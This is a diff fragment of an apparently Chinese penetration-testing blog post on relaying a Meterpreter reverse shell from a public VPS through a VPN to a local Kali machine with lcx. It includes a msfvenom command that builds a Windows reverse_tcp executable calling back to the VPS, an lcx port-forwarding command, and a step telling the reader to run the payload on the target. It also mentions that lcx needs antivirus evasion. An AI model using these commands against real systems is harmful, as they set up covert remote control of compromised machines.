+<h5 id="2-把来自外部的某个端口上的流量转到指定的其它机器上-典型应用场景-”-把来自公网的meterpreter直接通过vps转到本地的msf中-“-流程大致如下"><a href="#2-把来自外部的某个端口上的流量转到指定的其它机器上-典型应用场景-”-把来自公网的meterpreter直接通过vps转到本地的msf中-“-流程大致如下" class="headerlink" title="2,把来自外部的某个端口上的流量转到指定的其它机器上,典型应用场景,” 把来自公网的meterpreter直接通过vps转到本地的msf中 “,流程大致如下:"></a>2,把来自外部的某个端口上的流量转到指定的其它机器上,典型应用场景,” 把来自公网的meterpreter直接通过vps转到本地的msf中 “,流程大致如下:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -tran 来自外部的端口 指定机器的ip 指定机器上的端口</span></div></pre></td></tr></table></figure>
 <h5 id="1-先把kali连到vpn内网中-因为等会儿要走vpn内网转发-所以必须先连到vpn内网中-这是第一个比较关键的地方"><a href="#1-先把kali连到vpn内网中-因为等会儿要走vpn内网转发-所以必须先连到vpn内网中-这是第一个比较关键的地方" class="headerlink" title="1),先把kali连到vpn内网中,因为等会儿要走vpn内网转发,所以必须先连到vpn内网中,这是第一个比较关键的地方"></a>1),先把kali连到vpn内网中,因为等会儿要走vpn内网转发,所以必须先连到vpn内网中,这是第一个比较关键的地方</h5><p><img src="/img/forien_meter.png" alt=""><br></p>
 <h5 id="再顺手ping下vps的vpn内网ip-确认kali和vps之间通过vpn内网通信没有任何问题"><a href="#再顺手ping下vps的vpn内网ip-确认kali和vps之间通过vpn内网通信没有任何问题" class="headerlink" title="再顺手ping下vps的vpn内网ip,确认kali和vps之间通过vpn内网通信没有任何问题"></a>再顺手ping下vps的vpn内网ip,确认kali和vps之间通过vpn内网通信没有任何问题</h5><p><img src="/img/forien_meter_1.png" alt=""><br></p>
 <h5 id="2-然后-开始生成payload-注意这里payload回连的ip要写我们vps的公网ip"><a href="#2-然后-开始生成payload-注意这里payload回连的ip要写我们vps的公网ip" class="headerlink" title="2),然后,开始生成payload,注意这里payload回连的ip要写我们vps的公网ip"></a>2),然后,开始生成payload,注意这里payload回连的ip要写我们vps的公网ip</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=113.*.*.*(payload的回连ip要设成vps的) LPORT=8080 -f exe -o /root/Desktop/shell.exe</span></div></pre></td></tr></table></figure>
@@ -395,7 +383,7 @@
 <h5 id="4-第二个关键的地方-到vps上去做下转发-意思是把来自外部的8080-其实是我们自己的payload的回连端口-端口的流量通过vpn内网转到kali的8080端口上"><a href="#4-第二个关键的地方-到vps上去做下转发-意思是把来自外部的8080-其实是我们自己的payload的回连端口-端口的流量通过vpn内网转到kali的8080端口上" class="headerlink" title="4)第二个关键的地方,到vps上去做下转发,意思是把来自外部的8080(其实是我们自己的payload的回连端口)端口的流量通过vpn内网转到kali的8080端口上"></a>4)第二个关键的地方,到vps上去做下转发,意思是把来自外部的8080(其实是我们自己的payload的回连端口)端口的流量通过vpn内网转到kali的8080端口上</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -tran 8080 172.16.12.1 8080</span></div></pre></td></tr></table></figure>
 <p><img src="/img/forien_meter_3.png" alt=""><br></p>
 <h5 id="5-最后-把payload丢到目标上去执行-meterpreter被正常弹回-稍微留意下这里的上线ip-很显然-是通过vpn的内网ip过来的"><a href="#5-最后-把payload丢到目标上去执行-meterpreter被正常弹回-稍微留意下这里的上线ip-很显然-是通过vpn的内网ip过来的" class="headerlink" title="5)最后,把payload丢到目标上去执行,meterpreter被正常弹回,稍微留意下这里的上线ip,很显然,是通过vpn的内网ip过来的"></a>5)最后,把payload丢到目标上去执行,meterpreter被正常弹回,稍微留意下这里的上线ip,很显然,是通过vpn的内网ip过来的</h5><p><img src="/img/forien_meter_4.png" alt=""><br><br><br></p>
-<h4 id="关于lcx"><a href="#关于lcx" class="headerlink" title="关于lcx:"></a>关于lcx:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;需要免杀,对于简单的内网还能凑活,对于现在的一些场景已经不能很好的适用了,个人在实际内网渗透过程中基本用的不多(基本就是用来转下meterpreter和beef什么的),都是些简单辅助性的用途,工具也确实已经有些年头了,工具源码网上也到处都是,有兴趣可以仔细研读下(如果想自己过免杀的话),现在已经有很多更好的替代品,不过,这里还是感谢前辈们,在那个时代留给我们的财富<br><br><br></p>
+<h5 id="关于lcx"><a href="#关于lcx" class="headerlink" title="关于lcx:"></a>关于lcx:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;需要免杀,对于简单的内网还能凑活,对于现在的一些场景已经不能很好的适用了,个人在实际内网渗透过程中基本用的不多(基本就是用来转下meterpreter和beef什么的),都是些简单辅助性的用途,工具也确实已经有些年头了,工具源码网上也到处都是,有兴趣可以仔细研读下(如果想自己过免杀的话),现在已经有很多更好的替代品,不过,这里还是感谢前辈们,在那个时代留给我们的财富<br><br><br></p>
 
         </div>
     
